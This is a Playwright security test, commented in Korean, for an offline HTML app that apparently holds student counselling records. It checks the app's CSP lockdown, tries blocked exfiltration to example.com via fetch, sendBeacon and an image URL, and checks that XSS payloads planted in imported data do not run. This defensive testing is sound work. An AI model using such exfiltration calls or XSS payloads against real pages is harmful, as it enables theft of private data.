/* 보안 시험 — 가상 데이터만 사용
   npm install && npx playwright install chromium && node tests/security.test.js [배포 HTML 경로]
   (Chromium 경로를 직접 지정하려면 CHROMIUM_PATH 환경변수) */
const path = require('path'), fs = require('fs');
const { chromium } = require('playwright');
const FILE = path.resolve(process.argv[2] || fs.readdirSync(path.join(__dirname, '../dist')).filter(f => f.endsWith('.html')).map(f => path.join(__dirname, '../dist', f)).sort().pop());
let fail = 0; const ok = (c, m) => { console.log((c ? '✓ ' : '✗ ') + m); if (!c) fail++; };

(async () => {
  const b = await chromium.launch(process.env.CHROMIUM_PATH ? { executablePath: process.env.CHROMIUM_PATH } : {});
  const ctx = await b.newContext({ acceptDownloads: true });
  const p = await ctx.newPage();
  /* 실제로 오간 요청만 기록 (CSP가 막은 시도는 requestfailed로 끝남) */
  const requests = []; p.on('requestfinished', r => { if (!/^(file|data|blob):/.test(r.url())) requests.push(r.url()); });
  const errors = []; p.on('pageerror', e => errors.push(e.message));
  await p.goto('file://' + FILE); await p.waitForTimeout(500);
  await p.evaluate(() => { document.addEventListener('securitypolicyviolation', e => (window.__v = window.__v || []).push(e.violatedDirective)); });

  // 1. CSP 잠금 존재
  const csp = await p.evaluate(() => (document.querySelector('meta[http-equiv="Content-Security-Policy"]') || {}).content || '');
  ok(/connect-src 'none'/.test(csp) && /default-src 'none'/.test(csp) && !/unsafe-eval/.test(csp) && !/script-src[^;]*unsafe-inline/.test(csp), 'CSP: 통신 차단 · 해시로 지정된 스크립트만 실행');

  // 2. 평소 사용 흐름에서 차단 위반·오류·외부 요청 없음
  await p.evaluate(async () => {
    addDemoData();
    for (const t of ['counsel', 'student', 'list', 'sheet', 'check', 'grade', 'cur', 'help']) { setTab(t); await new Promise(r => setTimeout(r, 150)); }
  });
  const [d] = await Promise.all([p.waitForEvent('download'), p.evaluate(() => exportBackup())]);
  ok(!!(await d.path()), '백업 엑셀 내려받기 작동');
  ok(!(await p.evaluate(() => (window.__v || []).length)), '평소 사용 중 CSP 위반 0건');
  ok(errors.length === 0, '스크립트 오류 0건' + (errors.length ? ': ' + errors[0] : ''));

  // 3. 밖으로 보내기 시도는 모두 막힘
  const exfil = await p.evaluate(async () => {
    const r = {};
    try { await fetch('https://example.com/?d=1'); r.fetch = 'allowed'; } catch (e) { r.fetch = 'blocked'; }
    r.beacon = navigator.sendBeacon ? (navigator.sendBeacon('https://example.com/b', 'x') ? 'queued' : 'blocked') : 'n/a';
    await new Promise(res => { const i = new Image(); i.onload = () => { r.img = 'allowed'; res(); }; i.onerror = () => { r.img = 'blocked'; res(); }; i.src = 'https://example.com/p.png'; setTimeout(res, 1500); });
    return r;
  });
  ok(exfil.fetch === 'blocked', 'fetch 외부 전송 차단');
  ok(exfil.beacon !== 'queued' || !requests.some(u => u.includes('/b')), 'sendBeacon 외부 전송 차단');
  ok(exfil.img === 'blocked', '이미지 주소로 몰래 보내기 차단');

  // 4. 끼워 넣은 코드(인라인 이벤트·스크립트)는 실행되지 않음
  const inj = await p.evaluate(async () => {
    const div = document.createElement('div');
    div.innerHTML = '<img src="data:," onerror="window.__pwn=1"><svg onload="window.__pwn=2"></svg>';
    document.body.appendChild(div);
    const s = document.createElement('script'); s.textContent = 'window.__pwn=3'; document.body.appendChild(s);
    await new Promise(r => setTimeout(r, 300));
    div.remove(); s.remove();
    return window.__pwn || 0;
  });
  ok(inj === 0, '끼워 넣은 스크립트 실행 차단');

  // 5. 가져온 자료의 글자는 화면에서 글자로만 보임 (HTML로 해석되지 않음)
  const xss = await p.evaluate(async () => {
    const X = '<img src=x onerror="window.__x=1">"\'><svg onload="window.__x=2">';
    CUR.title = 'T' + X; CUR.school = 'S' + X; CUR.rows.slice(0, 5).forEach(r => { r.n += X; r.up += X; r.link = ['L' + X]; r.preExt = ['P' + X]; });
    setCur(CUR);
    DB.students.slice(0, 3).forEach(s => s.name += X);
    DB.records.slice(0, 5).forEach(r => { r.content = 'C' + X; r.career = 'K' + X; r.counselor = 'G' + X; r.src = 'F' + X; r.picks.push({ y: 2, s: 1, g: 'G' + X, n: 'N' + X, t: 'T', c: 3 }); });
    let n = 0;
    for (const t of ['counsel', 'student', 'list', 'sheet', 'check', 'grade', 'cur', 'help']) {
      if (t === 'counsel') { setTab('counsel'); await selectStudent(DB.students[0].id); }
      else if (t === 'student') { ST.stuSel = DB.students[0].id; setTab('student'); } else setTab(t);
      await new Promise(r => setTimeout(r, 150));
      n += document.querySelectorAll('img[src="x"],svg[onload]').length;
    }
    window.print = () => {}; printRecord(DB.records[0]); n += document.querySelectorAll('#print img[src="x"]').length;
    return n;
  });
  ok(xss === 0, '가져온 자료 속 HTML 조각이 화면에 끼어들지 않음');
  ok(requests.length === 0, '외부 네트워크 요청 0건' + (requests.length ? ': ' + requests.slice(0, 3).join(', ') : ''));

  await b.close();
  console.log(fail ? `\n${fail}건 실패` : '\n모든 보안 시험 통과');
  process.exit(fail ? 1 : 0);
})();
